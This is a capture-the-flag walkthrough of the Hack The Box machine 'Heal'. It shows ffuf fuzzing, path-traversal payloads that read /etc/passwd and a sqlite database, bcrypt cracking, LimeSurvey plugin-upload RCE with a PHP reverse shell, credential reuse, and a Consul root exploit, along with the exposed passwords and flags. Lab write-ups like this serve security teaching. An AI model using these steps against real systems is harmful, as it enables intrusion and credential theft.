# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | ssh |
| 80 | http |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
| 256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We need to add `heal.htb` to `/etc/hosts`:

```
echo '10.10.11.46 heal.htb' | sudo tee -a /etc/hosts
```

Let's start reconnaissance.


# RECONNAISSANCE
---

First thing we can see the moment we go into the website is the following:

![Pasted image 20250311135818.png](../../IMAGES/Pasted%20image%2020250311135818.png)


First thing I'd like doing, is fuzzing for subdomains and hidden directories, let's start with the subdomain fuzzing:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://heal.htb/ -H "Host: FUZZ.heal.htb" -t 200 -mc 200,301,302,403,500 -fs 178 -ic -c

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://heal.htb/
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header : Host: FUZZ.heal.htb
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200,301,302,403,500
 :: Filter : Response size: 178
________________________________________________

api [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 117ms]
```

Found a subdomain, let's add it to `/etc/hosts` too and check it out:


![Pasted image 20250311140959.png](../../IMAGES/Pasted%20image%2020250311140959.png)

Let's fuzz for API endpoints:

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://api.heal.htb/FUZZ" -ic -c

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://api.heal.htb/FUZZ
 :: Wordlist : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

download [Status: 401, Size: 26, Words: 2, Lines: 1, Duration: 2109ms]
```


We found a `/download` endpoint, let's try to enumerate it:

```
curl http://api.heal.htb/download
{"errors":"Invalid token"}
```

So, we need a token, my guess is that we need to create an account and get the token, when done, we can

```
curl "http://api.heal.htb/download?" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc" 
```

After creating our account we get our token, in my case, I got token:

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc
```


With our token, we can enumerate the api a bit more, let's check it out:

```
curl http://api.heal.htb/download -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc"
{"errors":"Error downloading file: no implicit conversion of nil into String"}
```

Now we are getting another error, let's try to fuzz in order to find our parameter, since this is a download endpoint we know that a parameter could be needed in order to use it, also, as we are dealing with this structure:

```
/download?parameter=file_to_download
```

After fuzzing we find the `filename` parameter, we can try fuzzing for LFI using ffuf:

```
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://api.heal.htb/download?filename=FUZZ" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc" -fs 64 -ic -c

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://api.heal.htb/download?filename=FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Header : Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Response size: 64
________________________________________________

..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 2120, Words: 18, Lines: 40, Duration: 109ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 2120, Words: 18, Lines: 40, Duration: 608ms]
/etc/apache2/apache2.conf [Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 2100ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2120, Words: 18, Lines: 40, Duration: 2102ms]
/etc/rpc [Status: 200, Size: 887, Words: 36, Lines: 41, Duration: 2098ms]
/proc/meminfo [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2095ms]
```

There we go, another thing I found while creating an account is there's a survey section in our profile:

![Pasted image 20250311164853.png](../../IMAGES/Pasted%20image%2020250311164853.png)

If we click it, we are redirected to another subdomain:

![Pasted image 20250311164915.png](../../IMAGES/Pasted%20image%2020250311164915.png)

Let's add it and try to fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://take-survey.heal.htb/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://take-survey.heal.htb/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

 [Status: 200, Size: 75816, Words: 32809, Lines: 1086, Duration: 328ms]
optin [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2146ms]
responses [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2142ms]
```

We get two, `optin` and `responses`, if we try going into `responses`, we are redirected into another site:

![Pasted image 20250311165040.png](../../IMAGES/Pasted%20image%2020250311165040.png)

So, now we know that we can make use of our LFI to get some credentials for this, let's start exploitation.


# EXPLOITATION
---

Now, once we know we got LFI, we can try reading some configuration files, we already know that we are dealing with ruby on rails so if we research the files structure, we get this:

![Pasted image 20250311165157.png](../../IMAGES/Pasted%20image%2020250311165157.png)

So, let's try to read the `/config/database.yml` file:

![Pasted image 20250311165242.png](../../IMAGES/Pasted%20image%2020250311165242.png)


We found the database file, it is `/storage/development.sqlite3`, let's download it into our machine to analyze it:


```
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc" "http://api.heal.htb/download?filename=../../storage/development.sqlite3" --output development.sqlite3
```

![Pasted image 20250311165424.png](../../IMAGES/Pasted%20image%2020250311165424.png)

We got an users table, we can see our administrator on top, `ralph`, it also got a Bcrypt hash so, let's try to decrypt it:


```
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
```


```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt


$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```


We got it, these are the credentials:

```
ralph:147258369
```

![Pasted image 20250311165940.png](../../IMAGES/Pasted%20image%2020250311165940.png)

We are dealing with LimeSurvey 6.6.4, lets' try to search for an exploit:

Exploit: https://ine.com/blog/cve-2021-44967-limesurvey-rce

Got an RCE exploit, we can follow the PoC in that article, the article also uses this script:

Script: https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

![Pasted image 20250311172029.png](../../IMAGES/Pasted%20image%2020250311172029.png)


In the script there's a `config.xml` file, since this RCE works for older versions, we need to change the file in this way:

![Pasted image 20250311171603.png](../../IMAGES/Pasted%20image%2020250311171603.png)


We also need to change our `php-rev.php` file to match our IP and listening port, after everything is set, let's zip both files and follow this:

```
zip exploit.zip config.xml php-rev.php
```


![Pasted image 20250311172151.png](../../IMAGES/Pasted%20image%2020250311172151.png)

Let's upload our zip file:

![Pasted image 20250311172223.png](../../IMAGES/Pasted%20image%2020250311172223.png)

Now, we need to activate:

![Pasted image 20250311172253.png](../../IMAGES/Pasted%20image%2020250311172253.png)

And visit this:

```
http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php
```

And we'll see this:

![Pasted image 20250311172439.png](../../IMAGES/Pasted%20image%2020250311172439.png)

We got ourselves a shell, let's begin privilege escalation.

# PRIVILEGE ESCALATION
---


First step to do is to get a stable shell:


1. /usr/bin/script -qc /bin/bash /dev/null
2. CTRL + Z
3. stty raw -echo; fg
4. reset xterm
5. export TERM=xterm
6. export BASH=bash


Nice, with our now stable shell, let's look around the machine, for example, previously when i read `/etc/passwd` I found another user:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

We got another user with a shell `ron`, let's try searching around for his credentials:

```
www-data@heal:~/limesurvey$ find / -name config.php 2>/dev/null
/var/www/limesurvey/vendor/kcfinder/conf/config.php
/var/www/limesurvey/vendor/yiisoft/yii/framework/messages/config.php
/var/www/limesurvey/vendor/yiisoft/yii/requirements/messages/config.php
/var/www/limesurvey/application/config/config.php
```

Let's check the last one:

```
www-data@heal:~/limesurvey/application/config$ cat config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
| 'connectionString' Hostname, database, port and database type for
| the connection. Driver example: mysql. Currently supported:
| mysql, pgsql, mssql, sqlite, oci
| 'username' The username used to connect to the database
| 'password' The password used to connect to the database
| 'tablePrefix' You can add an optional prefix, which will be added
| to the table name when using the Active Record class
|
*/
return array(
	'components' => array(
		'db' => array(
			'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
			'emulatePrepare' => true,
			'username' => 'db_user',
			'password' => 'AdmiDi0_pA$$w0rd',
			'charset' => 'utf8',
			'tablePrefix' => 'lime_',
		),
		
		 'session' => array (
			'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
			// Uncomment the following lines if you need table-based sessions.
			// Note: Table-based sessions are currently not supported on MSSQL server.
			// 'class' => 'application.core.web.DbHttpSession',
			// 'connectionID' => 'db',
			// 'sessionTableName' => '{{sessions}}',
		 ),
		
		'urlManager' => array(
			'urlFormat' => 'path',
			'rules' => array(
				// You can add your own rules here
			),
			'showScriptName' => true,
		),
	
		// If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
		//'request' => array(
		//	'baseUrl' => '/limesurvey',
		//),
	),
	// For security issue : it's better to set runtimePath out of web access
	// Directory must be readable and writable by the webuser
	// 'runtimePath'=>'/var/limesurvey/runtime/'
	// Use the following config variable to set modified optional settings copied from config-defaults.php
	'config'=>array(
	// debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
	// then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
	// on your webspace.
	// LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
		'debug'=>0,
		'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2

		// If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
		// public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
		//'publicurl' => 'https://www.example.org/limesurvey',

		// Update default LimeSurvey config here
	)
);
/* End of file config.php */
/* Location: ./application/config/config.php */
```

We can try those credentials with user `ron`:

```
ron:AdmiDi0_pA$$w0rd
```

![Pasted image 20250311173009.png](../../IMAGES/Pasted%20image%2020250311173009.png)

And there we are, we now got access to ssh using `ron`, let's use linpeas to look up a way to get into root:

![Pasted image 20250311174522.png](../../IMAGES/Pasted%20image%2020250311174522.png)

After analyzing the ports, at port `8500` we got a consul web page running:

![Pasted image 20250311175002.png](../../IMAGES/Pasted%20image%2020250311175002.png)

We can search for an exploit regarding that:

![Pasted image 20250311175610.png](../../IMAGES/Pasted%20image%2020250311175610.png)



Let's download it and use it:

![Pasted image 20250311175740.png](../../IMAGES/Pasted%20image%2020250311175740.png)

Our `acl_token` in this case is `1`:

![Pasted image 20250311175801.png](../../IMAGES/Pasted%20image%2020250311175801.png)

If we check our listener:

![Pasted image 20250311175815.png](../../IMAGES/Pasted%20image%2020250311175815.png)

We got root, let's read both flags finally:

```
root@heal:/# cat /home/ron/user.txt
770ea7c68e110ad3a2a606d030b75e5a
```

```
root@heal:/# cat /root/root.txt
4acd10a58b968cc986ed91e857354d78
```

Just like that, machine is done!

![Pasted image 20250311175926.png](../../IMAGES/Pasted%20image%2020250311175926.png)

https://www.hackthebox.com/achievement/machine/1872557/640

